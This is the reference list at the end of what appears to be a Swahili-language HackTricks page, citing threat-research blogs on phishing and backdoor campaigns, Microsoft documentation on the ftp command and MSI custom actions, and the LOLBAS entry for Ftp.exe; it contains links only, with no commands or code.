- [10] [Microsoft Security Blog – Wahusika tishio wanatumia msimu wa kodi kuendesha kampeni za phishing zenye mandhari ya kodi](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Mlolongo wa usambazaji wa UAT-11587 na backdoor ya Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER Inaongeza PapRAT kwenye Silaha Zake](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - Amri ya ftp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Aina ya Custom Action 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - Chaguo za uchakataji wa matokeo ya Custom Action](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
